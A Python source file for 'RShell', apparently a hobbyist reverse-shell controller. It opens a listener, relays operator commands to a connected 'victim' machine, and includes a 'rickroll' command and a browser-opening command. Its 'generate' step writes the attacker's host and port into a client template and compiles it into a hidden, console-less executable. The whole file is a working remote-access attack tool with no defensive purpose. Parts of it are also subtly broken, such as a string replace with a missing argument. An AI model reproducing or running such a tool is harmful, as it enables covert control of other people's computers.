import os
import sys
import socket
from pyfiglet import figlet_format
from rich.console import Console
from rich.table import Table

import subprocess as sp

from time import sleep
#from pyngrok import ngrok, conf
from threading import Thread

console = Console()

class Server:

    def __init__(self):
        self.port = None
        self.host = None

        self.ghost = None
        self.gport = None


    def send_commands(self, s, rHost, rPort):

        custom_help = """
[green]rickroll[/green] : [red]rickrolls the victim[/red]
[green]browse <URL>[/green] : [red]opens a url in the browser's victim[/red]
"""
        self.quit = "dbd73c2b545209688ed794c0d5413d5a"

        while True:
            try:
                noexec=["python", "nc", "python3", "@echo off", "if", "while"]

                prompt = f"[bold purple][[/bold purple][bold blue]{rHost}:{rPort}[bold purple]][/bold purple][bold blue]#[bold purple]$[/bold purple] "
                console.print(prompt, end="")
                command = input()

                if command.lower() == "quit" or command.lower() == "exit":
                    self.nice_exit(s)

                elif command == ":help":
                    console.print(custom_help)

                elif command in noexec:
                    console.print(f"[bold red]Dont execute commands that need an external input [bold blue](like [bold green]{command}[/bold green][bold blue])[bold red] they can break your shell[/bold red]")

                elif command == "cls":
                    try:
                        os.system("cls")
                    except:
                        console.print("\n[bold red]You're not on Windows[/bold red]")
                        continue

                elif command == "clear":
                    try:
                        os.system("clear")
                    except:
                        console.print("\n[bold red]Your're not on Linux[/bold red]")

                elif command == "":
                    pass

                else:
                    s.send(command.encode())
                    data = s.recv(4096)            #OUTPUT #OLD console.print(f"[bold]{data.decode('cp850').rstrip()}[/bold]")
                    if not data: break
                    if data.decode("cp850") == "Rickrolled":
                        console.print("[bold purple]RICKROLLED[/bold purple]")
                    elif data.decode("cp850") == "<PRINT NOTHING>":
                        pass
                    else:
                        print(data.decode("cp850"))     

            except KeyboardInterrupt:
                self.nice_exit()


    @staticmethod
    def check_filename(filename):
        if filename != ".py" and filename.endswith(".py"):
            return filename
        elif filename != ".pyw" and filename.endswith(".pyw"):
            return filename
        else:
            return filename+".py"


    def generate_payload(self, filename):
        
        error = "ImportError: No module named _bootlocale"
        fix = "--exclude-module _bootlocale"

        
        filename = self.check_filename(filename)

        tmp_host = "67b3dba8bc6778101892eb77249db32e"
        tmp_port = "901555fb06e346cb065ceb9808dcfc25"

        host = self.ghost
        port = self.gport

        with open("Utils/client-for-generation.py", "r") as client_g:
            payload = client_g.read()
            formatted_payload = payload.replace(tmp_host, host).replace(tmp_port, str(port))
        client_g.close()
            
        try:
            if os.path.exists("Generated"):
                pass
            else:
                os.mkdir("Generated")

        except FileExistsError:
            sleep(0.1)

        os.chdir("Generated")

        os.system(f"type NUL > {filename} || touch {filename}")

        with open(f"{filename}", "w") as payload_file:
            payload_file.write(formatted_payload)
        payload_file.close()

        try:
            console.print("[bold green]Compiling...[/bold green]")

            if sys.platform == "linux":
                compile_process = sp.run(f'pyinstaller --onefile --noconsole "{filename}" {fix}',
                        shell=True,
                        stdout=sp.PIPE,
                        stderr=sp.PIPE)

            else:
                compile_process = sp.run(f'pyinstaller --onefile --noconsole "{filename}"',
                        shell=True,
                        stdout=sp.PIPE,
                        stderr=sp.PIPE)
            
            if error in compile_process:
                console.print("Fixing compatibility problem...", style="bold purple")

            
            console.print(compile_process.stdout, style="green")
            console.print(compile_process.stderr, style="red")
            
        except Exception as e:
            print(f"Error compiling to exe.\n{e}")

        os.chdir("..")
        console.print("Done!")

        
    def nice_exit(self, s=None):
        console.print(f"\n[bold yellow]Exit? Y/n[/bold yellow] ", end="")
        sure=input()
        if sure.lower() == "y" or sure.lower() == "s" or sure.lower() == "":
            if s:
                s.send(self.quit.encode())
                s.close()
            console.print("Bye bye!!", style="bold green")
            sys.exit()
        else:
            pass


    @staticmethod
    def display_startup_message():
        message = figlet_format("RShell")
        console.print(f"[bold blue]{message}[/bold blue]")
        console.print("[bold blue]by Riccardo Zappitelli [bold red]https://github.com/Ricc4rdo0107[/bold red]")
        console.print("[bold blue]Use [purple]'help'[/purple][bold blue]![/bold blue]\n")

    
    def console(self):
        self.display_startup_message()
        print()

        console_help = """
    [white]g=l          [red]use the ghost and gport as lhost and lport[/red]

    [white]l=g          [red]use the lhost and lport as ghost and gport[/red]

    [white]start        [red]start the listener[/red]
    
    [white]info         [red]show the local host and the local port settings[/red]

    [white]generate    [blue]<filename> [red] generate the payload with your [blue]LHOST [red]and [blue]LPORT[/blue]
    
    [white]set LHOST   [blue]<xxx.xxx.xxx.xxx>   [red]set the local host[/red]
    [white]set LPORT   [blue]<xxxx in numbers>  [red]set the local port[/red]
    
    [white]exit/quit    [red]exit from the program[/red]
    
    [white]default      [red]start the listener with lhost:127.0.0.1 and port:4444[/red]
"""

        while True:

            info = f"""[bold blue]
[bold green]FOR LOCAL HOSTING:[/bold green]
LHOST : <[bold purple]{self.host}[bold blue]>
LPORT : <[bold purple]{self.port}[bold blue]>

[bold green]TO GENERATE PAYLOAD:[/bold green]
GHOST : <[bold purple]{self.ghost}[bold blue]>
GPORT : <[bold purple]{self.gport}[bold blue]>
                          [/bold blue]"""

            try:
                console.print("[bold blue]RShell> ", end="")
                cmd = input()

                if cmd.lower() == "help":
                    console.print(console_help)

                elif cmd.lower().startswith("exec"):
                    cmd_ = cmd.replace("exec ")
                    os.system(cmd_)

                elif cmd.startswith("generate"):
                    try:
                        if len(str(self.ghost))>=7 and str(self.gport).isdigit():
                            filename = cmd[9:]

                            if filename.isspace() or filename == "":
                                console.print("[bold purple]You have to submit a name[/bold purple]")
                            else:
                                self.generate_payload(filename)

                        else:
                            console.print("""[bold purple]Before generating the payload,
you must to submit a [bold red]VALID[bold blue] GHOST [bold purple]and [bold blue]GPORT[/bold blue]""")
                    except Exception as e:
                        console.print(f"[bold purple]Cannot generate payload:\n[bold red]{e}[/bold red]")
                    

                elif cmd.lower().startswith("set lhost"):
                    self.host = cmd[10:]

                elif cmd.lower().startswith("set lport"):
                    str_port = cmd[10:]
                    if str_port.isdigit():
                        self.port = int(str_port)
                    else:
                        console.print("[bold purple]Please enter a valid port number[/bold purple]")

                elif cmd.lower().startswith("set ghost"):
                    self.ghost = cmd[10:]

                elif cmd.lower().startswith("set gport"):
                    str_gport = cmd[10:]
                    if str_gport.isdigit():
                        self.gport = int(str_gport)
                    else:
                        console.print("[bold purple]Please enter a valid port number[/bold purple]")

                elif cmd.lower() == "g=l":
                    self.ghost = self.host
                    self.gport = self.port

                elif cmd.lower() == "l=g":
                    self.host = self.ghost
                    self.port = self.gport

                elif cmd.lower() == "start":
                    if len(self.host)>=7 and str(self.port).isdigit():
                        self.server(self.host, self.port)
                    else:
                        console.print("[bold purple]You have to submit a [bold red]VALID[bold blue] HOST [bold purple]and [bold blue]PORT[/bold blue]")

                elif cmd.lower() == "info":
                    console.print(info)

                elif cmd.lower() == "default" or cmd.lower() == "d":
                    self.server("127.0.0.1", 4444)

                elif cmd.lower() == "exit" or cmd.lower() == "quit":
                    self.nice_exit()

                elif cmd.lower() == "cls":
                    os.system("cls")

            except KeyboardInterrupt:
                self.nice_exit()


    def server(self, host, port):
        self.host = host
        self.port = port

        s = socket.socket()
        s.bind((host, port))
        s.listen()

        console.print("\n[bold purple]Listening...[/bold purple]")

        conn, raddr = s.accept()

        console.print(f"[bold purple]Connection established with  [bold purple][[bold blue]{raddr[0]}:{raddr[1]}[/bold blue][bold purple]]\n")
        console.print("[bold blue]Use [purple]':help'[/purple][bold blue] to show custom commands[/bold blue]")

        self.send_commands(conn, raddr[0], raddr[1])


Server().console()